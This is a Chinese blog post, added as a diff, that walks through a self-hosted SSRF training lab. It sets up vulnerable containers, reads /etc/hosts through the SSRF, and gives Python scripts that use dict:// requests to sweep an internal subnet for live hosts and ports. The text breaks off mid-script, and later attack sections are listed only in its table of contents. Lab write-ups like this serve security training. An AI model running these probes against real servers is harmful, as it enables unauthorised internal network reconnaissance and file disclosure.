@@ -1,0 +1,893 @@
+
+  <!DOCTYPE html>
+  <html lang="zh-CN"  >
+  <head>
+  <meta charset="utf-8">
+  
+
+  
+
+  
+
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_bq08450reo';window.REIMU_CONFIG.clipboard_tips = {"success":"复制成功(*^▽^*)","fail":"复制失败 (ﾟ⊿ﾟ)ﾂ","copyright":{"enable":false,"count":50,"content":"本文版权：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！"}};window.REIMU_CONFIG.code_block = {"expand":true};</script>
+  
+  <title>
+    国光SSRF打穿内网 |
+    
+    KL
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+  
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_bq08450reo.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+  
+  
+    <meta name="description" content="靶场环境 源码： https:&#x2F;&#x2F;github.com&#x2F;sqlsec&#x2F;ssrf-vuls  这里有168师傅的一键启动docker-compose.yml，直接docker-compose up -d即可 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525">
+<meta property="og:type" content="article">
+<meta property="og:title" content="国光SSRF打穿内网">
+<meta property="og:url" content="http://example.com/2026/03/02/%E5%9B%BD%E5%85%89SSRF%E6%89%93%E7%A9%BF%E5%86%85%E7%BD%91/index.html">
+<meta property="og:site_name" content="KL">
+<meta property="og:description" content="靶场环境 源码： https:&#x2F;&#x2F;github.com&#x2F;sqlsec&#x2F;ssrf-vuls  这里有168师傅的一键启动docker-compose.yml，直接docker-compose up -d即可 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2026/03/02/images/16205694239190.png">
+<meta property="og:image" content="http://example.com/2026/03/02/images/%E5%9B%BD%E5%85%89ssrf.png">
+<meta property="og:image" content="http://example.com/2026/03/02/images/image-20260301214044576.png">
+<meta property="og:image" content="http://example.com/2026/03/02/images/QQ20250403-111356.jpg">
+<meta property="og:image" content="http://example.com/2026/03/02/images/image-20260301215615267.png">
+<meta property="og:image" content="http://example.com/2026/03/02/images/16159601558925.png">
+<meta property="og:image" content="http://example.com/2026/03/02/images/16159620724415.png">
+<meta property="og:image" content="http://example.com/2026/03/02/images/16159622165771.png">
+<meta property="og:image" content="http://example.com/2026/03/02/images/16159623108967.png">
+<meta property="og:image" content="http://example.com/2026/03/02/images/image-20260301222751081.png">
+<meta property="og:image" content="http://example.com/2026/03/02/images/image-20260301223110684.png">
+<meta property="og:image" content="http://example.com/2026/03/02/images/image-20260301224209936.png">
+<meta property="og:image" content="http://example.com/2026/03/02/images/16204668042945.png">
+<meta property="og:image" content="http://example.com/2026/03/02/images/16204671626680.png">
+<meta property="og:image" content="http://example.com/2026/03/02/images/16204672777528.png">
+<meta property="og:image" content="http://example.com/2026/03/02/images/16204676811766.png">
+<meta property="og:image" content="http://example.com/2026/03/02/images/16204679134706.png">
+<meta property="og:image" content="http://example.com/2026/03/02/images/16204695776705.png">
+<meta property="og:image" content="http://example.com/2026/03/02/images/16204695857520.png">
+<meta property="og:image" content="http://example.com/2026/03/02/images/16204701072416.png">
+<meta property="og:image" content="http://example.com/2026/03/02/images/16204703947056.png">
+<meta property="article:published_time" content="2026-03-02T08:40:51.000Z">
+<meta property="article:modified_time" content="2026-03-01T15:32:23.476Z">
+<meta property="article:author" content="FuB0Y">
+<meta property="article:tag" content="ssrf">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2026/03/02/images/16205694239190.png">
+  
+  
+    <link rel="alternate" href="/atom.xml" title="KL" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+  
+    
+      
+        
+<link rel="stylesheet" href="https://npm.webcache.cn/katex@0.16.11/dist/katex.min.css">
+
+      
+    
+  
+  
+  
+  
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+  
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.0/dist/aos.css">
+
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+  <body>
+    
+  <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi">
+        
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+        
+      </div>
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var startLoading = () => {
+      time = Date.now();
+      document.getElementById('loader').classList.remove("loading");
+    }
+    var endLoading = () => {
+      if (!time) {
+        document.body.style.overflow = 'auto';
+        document.getElementById('loader').classList.add("loading");
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          document.body.style.overflow = 'auto';
+          document.getElementById('loader').classList.add("loading");
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    document.getElementById('loader').addEventListener('click', endLoading);
+  </script>
+
+<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+</div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav">
+    
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/">首页</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/archives">归档</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/about">关于</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/friend">友链</a>
+        </span>
+      
+    
+    <a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav">
+    
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅" target="_blank"></a>
+    
+    
+    
+  </nav>
+</div>
+<header id="header">
+  
+    <picture>
+      
+    </picture>
+    
+      <img fetchpriority="high" src="/images/banner.webp" alt="国光SSRF打穿内网">
+    
+  
+  <div id="header-outer">
+    <div id="header-title">
+      
+        
+        
+          <a href="/" id="logo">
+            <h1 data-aos="slide-up">国光SSRF打穿内网</h1>
+          </a>
+        
+      
+      
+        
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+
+        <div id="content"  class="sidebar-right" >
+          <aside id="sidebar">
+  
+  
+  <div class="sidebar-wrapper wrap-sticky">
+    <div class="sidebar-wrap" data-aos="fade-up">
+      
+        <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%B6%E5%9C%BA%E7%8E%AF%E5%A2%83"><span class="toc-number">1.</span> <span class="toc-text"> 靶场环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#192168139141-%E5%85%A5%E5%8F%A3%E6%8E%A2%E6%B5%8B"><span class="toc-number">2.</span> <span class="toc-text"> 192.168.139.141-入口探测</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%A5%E5%8F%A3%E7%82%B9ssrf%E6%8E%A2%E6%B5%8B%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF"><span class="toc-number">3.</span> <span class="toc-text"> 入口点SSRF探测内网信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1921681002280-%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5"><span class="toc-number">4.</span> <span class="toc-text"> 192.168.100.22:80-代码注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1921681002380-sql%E6%B3%A8%E5%85%A5"><span class="toc-number">5.</span> <span class="toc-text"> 192.168.100.23:80-SQL注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1921681002480-ping%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8Cpost"><span class="toc-number">6.</span> <span class="toc-text"> 192.168.100.24:80-ping命令执行(POST)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#curl%E6%89%93%E6%B3%95"><span class="toc-number">6.1.</span> <span class="toc-text"> curl打法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#gopher%E6%89%93%E6%B3%95"><span class="toc-number">6.2.</span> <span class="toc-text"> Gopher打法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1921681002580-xxe"><span class="toc-number">7.</span> <span class="toc-text"> 192.168.100.25:80-XXE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#192168100268080-tomcat8519-cve-2017-12615"><span class="toc-number">8.</span> <span class="toc-text"> 192.168.100.26:8080-Tomcat&#x2F;8.5.19 CVE-2017-12615</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#192168100276379-redis%E6%9C%AA%E6%8E%88%E6%9D%83"><span class="toc-number">9.</span> <span class="toc-text"> 192.168.100.27:6379-Redis未授权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#dict%E5%8D%8F%E8%AE%AE"><span class="toc-number">9.1.</span> <span class="toc-text"> dict协议</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dict%E5%8D%8F%E8%AE%AE%E6%89%93%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1getshell"><span class="toc-number">9.2.</span> <span class="toc-text"> dict协议打定时任务getshell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#192168100286379-redis%E5%AF%86%E7%A0%81%E8%AE%A4%E8%AF%81"><span class="toc-number">10.</span> <span class="toc-text"> 192.168.100.28:6379-Redis密码认证</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#192168100293306-%E6%9C%AA%E6%8E%88%E6%9D%83mysql"><span class="toc-number">11.</span> <span class="toc-text"> 192.168.100.29:3306-未授权mysql</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%8E%9F%E5%A7%8B%E6%95%B0%E6%8D%AE%E5%8C%85"><span class="toc-number">11.1.</span> <span class="toc-text"> 获取原始数据包</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%9F%E6%88%90-gopher-%E6%95%B0%E6%8D%AE%E6%B5%81"><span class="toc-number">11.2.</span> <span class="toc-text"> 生成 gopher 数据流</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ssrf-%E4%B9%8B-%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">11.3.</span> <span class="toc-text"> SSRF 之 查询数据库</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ssrf-%E4%B9%8B-mysql-%E6%8F%90%E6%9D%83"><span class="toc-number">11.4.</span> <span class="toc-text"> SSRF 之 MySQL 提权</span></a></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="FuB0Y" class="lazyload">
+  <div class="sidebar-author-name">FuB0Y</div>
+  <div class="sidebar-description">世所谓英雄者，不以挫抑而灰心，不以失败而退怯</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">396</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">13</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">327</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+      
+      
+        <div class="sidebar-btn-wrapper" style="position:static">
+          <div class="sidebar-toc-btn current"></div>
+          <div class="sidebar-common-btn"></div>
+        </div>
+      
+    </div>
+  </div>
+
+  <div class="sidebar-widget">
+  
+  </div>
+</aside>
+
+          <section id="main"><article id="post-国光SSRF打穿内网" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <a href="/2026/03/02/%E5%9B%BD%E5%85%89SSRF%E6%89%93%E7%A9%BF%E5%86%85%E7%BD%91/" class="article-date-link" data-aos="zoom-in">
+    <time datetime="2026-03-02T08:40:51.000Z" itemprop="datePublished">2026-03-02</time>
+    <time style="display: none;" id="post-update-time">2026-03-01</time>
+  </a>
+</div>
+
+      
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E7%9F%A5%E8%AF%86%E7%82%B9/" data-aos="zoom-in">知识点</a>
+  </div>
+
+
+    </div>
+    <div class="hr-line"></div>
+    
+
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+      
+        <h2 id="靶场环境"><a class="markdownIt-Anchor" href="#靶场环境"></a> 靶场环境</h2>
+<p>源码：<br />
+<a target="_blank" rel="noopener" href="https://github.com/sqlsec/ssrf-vuls">https://github.com/sqlsec/ssrf-vuls</a></p>
+<p><img src="../images/16205694239190.png" alt="img" /></p>
+<p>这里有168师傅的一键启动docker-compose.yml，直接<code>docker-compose up -d</code>即可</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">networks:</span></span><br><span class="line">  <span class="attr">ssrf_v:</span></span><br><span class="line">    <span class="attr">ipam:</span></span><br><span class="line">      <span class="attr">config:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">subnet:</span> <span class="number">192.168</span><span class="number">.100</span><span class="number">.0</span><span class="string">/24</span>  <span class="comment"># 改为 192.168.100.0/24，避免冲突</span></span><br><span class="line">          <span class="attr">gateway:</span> <span class="number">192.168</span><span class="number">.100</span><span class="number">.1</span></span><br><span class="line"></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">ssrfweb1:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">selectarget/ssrf_web:v1</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="number">8090</span><span class="string">:80</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="attr">ssrf_v:</span></span><br><span class="line">        <span class="attr">ipv4_address:</span> <span class="number">192.168</span><span class="number">.100</span><span class="number">.21</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">ssrfweb2:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">selectarget/ssrf_codesec:v2</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="attr">ssrf_v:</span></span><br><span class="line">        <span class="attr">ipv4_address:</span> <span class="number">192.168</span><span class="number">.100</span><span class="number">.22</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">ssrfweb3:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">selectarget/ssrf_sql:v3</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="attr">ssrf_v:</span></span><br><span class="line">        <span class="attr">ipv4_address:</span> <span class="number">192.168</span><span class="number">.100</span><span class="number">.23</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">ssrfweb4:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">selectarget/ssrf_commandexec:v4</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="attr">ssrf_v:</span></span><br><span class="line">        <span class="attr">ipv4_address:</span> <span class="number">192.168</span><span class="number">.100</span><span class="number">.24</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">ssrfweb5:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">selectarget/ssrf_xxe:v5</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="attr">ssrf_v:</span></span><br><span class="line">        <span class="attr">ipv4_address:</span> <span class="number">192.168</span><span class="number">.100</span><span class="number">.25</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">ssrfweb6:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">selectarget/ssrf_tomcat:v6</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="attr">ssrf_v:</span></span><br><span class="line">        <span class="attr">ipv4_address:</span> <span class="number">192.168</span><span class="number">.100</span><span class="number">.26</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">ssrfweb7:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">selectarget/ssrf_redisunauth:v7</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="attr">ssrf_v:</span></span><br><span class="line">        <span class="attr">ipv4_address:</span> <span class="number">192.168</span><span class="number">.100</span><span class="number">.27</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">ssrfweb8:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">selectarget/ssrf_redisauth:v8</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="attr">ssrf_v:</span></span><br><span class="line">        <span class="attr">ipv4_address:</span> <span class="number">192.168</span><span class="number">.100</span><span class="number">.28</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">ssrfweb9:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">selectarget/ssrf_mysql:v9</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="attr">ssrf_v:</span></span><br><span class="line">        <span class="attr">ipv4_address:</span> <span class="number">192.168</span><span class="number">.100</span><span class="number">.29</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>如果想自己做的话：</p>
+<p>探姬师傅这里有dockerfile的源码：<a target="_blank" rel="noopener" href="https://github.com/ProbiusOfficial/ssrf-labs">https://github.com/ProbiusOfficial/ssrf-labs</a></p>
+<p>然后对每一个进行<code>docker build -t fmx/ssrf-web2:latest .</code></p>
+<p>登录DockerHub：<code>docker login -u fmx</code></p>
+<p>推送镜像：</p>
+<p><code>docker push fmx/ssrf-web2:latest</code></p>
+<p>然后用以下格式同时启动9台机器即可</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">ssrfweb1:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">fmx/ssrf-web1:latest</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">8090</span><span class="string">:80</span></span><br></pre></td></tr></table></figure>
+<h2 id="192168139141-入口探测"><a class="markdownIt-Anchor" href="#192168139141-入口探测"></a> 192.168.139.141-入口探测</h2>
+<p><img src="../images/%E5%9B%BD%E5%85%89ssrf.png" alt="alt text" /></p>
+<p>能访问外网百度</p>
+<p>用file协议去获取信息进一步探测内网</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file:///etc/hosts</span><br></pre></td></tr></table></figure>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1	localhost</span><br><span class="line">::1	localhost ip6-localhost ip6-loopback</span><br><span class="line">fe00::	ip6-localnet</span><br><span class="line">ff00::	ip6-mcastprefix</span><br><span class="line">ff02::1	ip6-allnodes</span><br><span class="line">ff02::2	ip6-allrouters</span><br><span class="line">192.168.100.21	7e68593461ed</span><br></pre></td></tr></table></figure>
+<p>可以得知当前机器的内网地址为 <strong>192.168.100.21</strong></p>
+<p>进一步对该网段进行探测</p>
+<blockquote>
+<p>权限高的情况下还可以尝试读取 <code>/proc/net/arp</code> 或者 <code>/etc/network/interfaces</code> 来判断当前机器的网络情况</p>
+</blockquote>
+<h2 id="入口点ssrf探测内网信息"><a class="markdownIt-Anchor" href="#入口点ssrf探测内网信息"></a> 入口点SSRF探测内网信息</h2>
+<p>使用dict协议扫描内网存活主机（或者用bp抓包爆破）</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://192.168.139.141:8090/&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">255</span>):</span><br><span class="line">    ip=<span class="string">&quot;192.168.100.&quot;</span>+<span class="built_in">str</span>(i)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r=requests.post(url,data=&#123;<span class="string">&quot;url&quot;</span>:<span class="string">f&quot;dict://<span class="subst">&#123;ip&#125;</span>/&quot;</span>&#125;,timeout=<span class="number">1.5</span>)</span><br><span class="line">        <span class="built_in">print</span>(ip+<span class="string">&quot;存活&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> requests.exceptions.Timeout:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    time.sleep(<span class="number">0.3</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*]：扫描结束&quot;</span>)</span><br></pre></td></tr></table></figure>
+<p>结果：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">192.168.100.1存活</span><br><span class="line">192.168.100.21存活</span><br><span class="line">192.168.100.22存活</span><br><span class="line">192.168.100.23存活</span><br><span class="line">192.168.100.24存活</span><br><span class="line">192.168.100.26存活</span><br><span class="line">192.168.100.27存活</span><br><span class="line">192.168.100.28存活</span><br><span class="line">192.168.100.29存活</span><br></pre></td></tr></table></figure>
+<p>通过dict协议扫描目标端口返回特征指纹，信息不同，可以判断服务是否存活</p>
+<p>例如<code>dict://192.168.100.22:80</code></p>
+<p><img src="../images/image-20260301214044576.png" alt="image-20260301214044576" /></p>
+<p>探测内网端口：</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">ips = [</span><br><span class="line">    <span class="string">&quot;192.168.100.21&quot;</span>,</span><br><span class="line">    <span class="string">&quot;192.168.100.22&quot;</span>,</span><br><span class="line">    <span class="string">&quot;192.168.100.23&quot;</span>,</span><br><span class="line">    <span class="string">&quot;192.168.100.24&quot;</span>,</span><br><span class="line">    <span class="string">&quot;192.168.100.25&quot;</span>,</span><br><span class="line">    <span class="string">&quot;192.168.100.26&quot;</span>,</span><br><span class="line">    <span class="string">&quot;192.168.100.27&quot;</span>,</span><br><span class="line">    <span class="string">&quot;192.168.100.28&quot;</span>,</span><br><span class="line">    <span class="string">&quot;192.168.100.29&quot;</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://192.168.139.141:8090/&quot;</span></span><br><span class="line">ports = [<span class="number">80</span>, <span class="number">8080</span>, <span class="number">443</span>, <span class="number">6379</span>, <span class="number">3306</span>]  <span class="comment"># 支持 Web、Redis 和 MySQL 端口</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ip <span class="keyword">in</span> ips:</span><br><span class="line">    <span class="keyword">for</span> port <span class="keyword">in</span> ports:</span><br><span class="line">        target = <span class="string">f&quot;<span class="subst">&#123;ip&#125;</span>:<span class="subst">&#123;port&#125;</span>&quot;</span></span><br><span class="line">        payload = &#123;</span><br><span class="line">            <span class="string">&quot;url&quot;</span>: <span class="string">&quot;dict://&quot;</span> + target</span><br><span class="line">        